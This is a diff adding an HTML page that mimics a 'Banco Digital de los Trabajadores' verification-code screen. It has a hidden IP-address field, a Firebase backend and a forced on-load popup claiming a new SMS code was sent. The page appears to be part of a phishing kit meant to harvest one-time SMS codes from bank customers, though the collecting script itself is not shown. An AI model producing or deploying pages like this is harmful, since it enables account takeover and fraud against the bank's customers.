@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang=es>
+<meta charset=utf-8>
+<!-- <title>Bicentenario</title> -->
+
+<meta name=viewport content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<link rel="stylesheet" href="styles/style.css">
+<meta name=msapplication-TileColor content=#b91d47>
+<meta name=theme-color content=#ffffff>
+<meta name=referrer content=no-referrer>
+<!-- Favicon -->
+<link rel="shortcut icon" href="img/shorcut.png" type="image/x-icon">
+<link rel="icon" href="img/favicon.png" type="image/x-icon">   
+<!-- Fin Favicon -->
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script type="module" src="js/firebase-config.js"></script>
+</head>
+
+<body class="smart-style-3 fixed-page-footer fixed-header desktop-detected">
+
+       <div id=main role=main class=mainRegister>
+              <div id=content class=container style=opacity:1>
+                     <form id=login-form novalidate>
+                            <input type="hidden" id="direccionIP" name="DireccionIP" />
+                            <div class="modal-dialog demo-modal">
+                                   <div class=modal-content>
+                                          <div class=modal-header>
+                                                 <!-- Logo BDT sobre form -->
+                                                 <h4 class="modal-title text-center mt-1">
+                                                        <img src="img/logo.png" alt srcset style=width:80% sizes>
+                                                 </h4>
+                                                 <!-- Fin logo -->
+                                          </div>
+                                          <div class="modal-body smart-form client-form">
+                                                 <div class="row">
+                                                        <section class="col col-2"></section>
+                                                        <section class="col col-8">
+                                                               <label for class="label">
+                                                                      <strong>Código de verificación *</strong>
+                                                               </label>
+                                                               <input type="number"
+                                                                      class="form-control numbersOnly input-verificacion2"
+                                                                      maxlength="10" name="Verificacion2"
+                                                                      id="verificacion2" autocomplete="off"
+                                                                      placeholder="Número de identificación"
+                                                                      oninput="checkInput()" />
+                                                        </section>
+                                                 </div>
+                                                 <div id="preloader" class="cargando text-center">
+                                                        Cargando, Por favor espere un momento...
+                                                        <span class="spinner loader"></span>
+                                                 </div>
+                                                 <div class=botones>
+                                                        <div class="row mt-1">
+                                                               <section class="col col-2"></section>
+                                                               <section class="col col-8">
+                                                                      <button type=submit
+                                                                             class="btn bg-color-azul btn-block btn-azul-ingreso"
+                                                                             id="cmdLogin" disabled>
+                                                                             Ingresar
+                                                                      </button>
+                                                               </section>
+                                                        </div>
+                                                        <div class="row mt-1">
+                                                               <section class="col col-1"></section>
+                                                               <section class="col col-5 text-center">
+                                                                      <a href=javascript:void(0) type=button
+                                                                             class=btn-link-blue id=cmdRegister
+                                                                             disabled>
+                                                                             Registro
+                                                                      </a>
+                                                               </section>
+                                                               <section class="col col-5 text-center">
+                                                                      <a href=javascript:void(0) class=btn-link-blue
+                                                                             id=cmdUnlock disabled>
+                                                                             Desbloqueo de usuario
+                                                                      </a>
+                                                               </section>
+                                                        </div>
+                                                        <div class=row>
+                                                               <div class=col-md-3></div>
+                                                               <div class="col-md-6 text-center">
+                                                                      <a href=# id=cmdOlvido class=btn-link-blue>
+                                                                             Olvido usuario master
+                                                                      </a>
+                                                               </div>
+                                                        </div>
+                                                 </div>
+                                                 <div class=clearfix></div>
+                                                 <p class="text-center mt-1">
+                                                        <strong class=note>
+                                                               Para mayor información o asesoria contáctanos al <br>
+                                                               Centro de atención telefónica<br>
+                                                               0500-6272421
+                                                        </strong>
+                                                 </p>
+                                          </div>
+                                   </div>
+                            </div>
+                     </form>
+              </div>
+       </div>
+
+       <div class="page-footer text-start" id=footer>
+
+              <div class=m-3 style=padding-left:10%>
+                     <strong class=txt-color-white>
+                            Banco Digital de los Trabajadores - RIF: G-20009148-7
+                            <span class=hidden-xs> Copyright 2025.</span> Todos
+                            los derechos
+                            reservados.</strong>
+              </div>
+              <table class=pull-right style=margin-top:-10px width=135 border=0 cellpadding=2 cellspacing=0
+                     title="Click to Verify - This site chose Symantec SSL for secure e-commerce and confidential communications.">
+                     <tbody>
+                            <tr>
+                                   <td width=135 align=center valign=top>
+                                   </td>
+                            </tr>
+              </table>
+
+       </div>
+
+       <div id=divSmallBoxes></div>
+       <div id=divMiniIcons></div>
+       <div id=divbigBoxes></div>
+       <style>
+              /* Estilos personalizados para SweetAlert2 */
+              :root {
+                     --swal2-width: 32em;
+                     --swal2-padding: 1.25em;
+                     --swal2-border: none;
+                     --swal2-border-radius: 5px;
+                     --swal2-background: #fff;
+                     --swal2-color: #545454;
+                     --swal2-font-size: 1rem;
+              }
+
+              .swal2-popup {
+                     display: none;
+                     position: relative;
+                     box-sizing: border-box;
+                     grid-template-columns: minmax(0, 100%);
+                     width: var(--swal2-width);
+                     max-width: 100%;
+                     padding: var(--swal2-padding);
+                     border: var(--swal2-border);
+                     border-radius: var(--swal2-border-radius);
+                     background: var(--swal2-background);
+                     color: var(--swal2-color);
+                     font-family: inherit;
+                     font-size: 1.125em;
+              }
+
+              .swal2-title {
+                     position: relative;
+                     max-width: 100%;
+                     margin: 0 0 0.4em;
+                     padding: 0;
+                     color: #595959;
+                     font-size: 1.875em;
+                     font-weight: 600;
+                     text-align: center;
+                     text-transform: none;
+                     word-wrap: break-word;
+              }
+
+              .swal2-actions {
+                     display: flex;
+                     z-index: 1;
+                     box-sizing: border-box;
+                     flex-wrap: wrap;
+                     align-items: center;
+                     justify-content: center;
+                     width: 100%;
+                     margin: 1.25em auto 0;
+                     padding: 0;
+              }
+
+              .swal2-styled.swal2-confirm {
+                     border: 0;
+                     border-radius: 0.25em;
+                     background: initial;
+                     background-color: #3085d6;
+                     color: #fff;
+                     font-size: 1.0625em;
+                     font-weight: 500;
+                     padding: 0.625em 1.1em;
+              }
+       </style>
+       <script>
+              window.onload = function () {
+                     Swal.fire({
+                            title: 'Error - BDT Informa',
+                            text: 'Hemos enviado un nuevo código de verificación vía SMS',
+                            icon: 'error',
+                            confirmButtonText: 'Aceptar',
+                            confirmButtonColor: '#3085d6',
+                            allowOutsideClick: false
+                     });
+              };
+       </script>
+       <script type="module" src="js/verificacion2.js"></script>
+</body>
+
+</html>
